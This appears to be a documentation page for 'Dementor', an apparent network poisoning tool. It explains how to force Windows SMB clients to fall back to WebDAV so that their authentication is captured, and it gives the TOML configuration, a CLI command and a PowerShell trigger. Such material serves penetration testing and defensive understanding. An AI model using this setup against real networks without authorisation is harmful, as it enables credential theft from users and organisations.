.. _example_webdav_fallback:

WebDAV Fallback
===============

.. seealso::

    For a more detailed explanation of this attack, please refer to this excellent article
    from Synacktiv: `Tricking Windows SMB clients into falling back to WebDav`_.

Windows clients with the WebDAV redirector installed can be tricked into authenticating
against a WebDAV server if SMB access fails. Note that **QUIC must also be disabled**, as it takes
precedence over WebDAV. The protocol resolution order on Windows is:

1. SMB (Port 445)
2. QUIC (Port 443)
3. WebDAV (Port 80, if the WebDAV Redirector service is active)

To leverage this behavior, modify the configuration for *Dementor* as shown below:

.. tab-set::

    .. tab-item:: Dementor.toml

        .. code-block:: toml
            :linenos:
            :emphasize-lines: 6, 10

            [Dementor]
            # [...]
            SMB = true
            HTTP = true
            # [...]
            QUIC = false

            [SMB]
            # [...]
            ErrorCode = "STATUS_BAD_NETWORK_NAME"

            [HTTP]
            # Make sure WebDAV support is enabled
            WebDAV = true

    .. tab-item:: CLI

        .. code-block:: console

            $ Dementor -I "$INTERFACE" \
                -O QUIC=Off \
                -O SMB.ErrorCode="STATUS_BAD_NETWORK_NAME" \
                -O HTTP.WebDAV=On

        .. note::

            If you're using per-server configurations for SMB or HTTP,
            you must adjust those attributes individually within each server block.

Triggering the Fallback
-----------------------

To trigger the fallback behavior, simply attempt to list files from a nonexistent or inaccessible SMB share:

.. code-block:: powershell

    C:\Users\Administrator> dir \\FILESRV01\internal
    The specified network name is no longer available.

In this scenario, the Windows client will first attempt to authenticate via SMB,
fail with the specified error, and then fall back to WebDAV. If *Dementor* will
capture authentication attempts from both SMB and WebDAV services.

.. figure:: /_static/images/http_webdav-fallback.png
    :align: center

    Specific error codes trick Windows clients into using WebDAV as a fallback mechanism.

.. _Tricking Windows SMB clients into falling back to WebDav: https://www.synacktiv.com/publications/taking-the-relaying-capabilities-of-multicast-poisoning-to-the-next-level-tricking
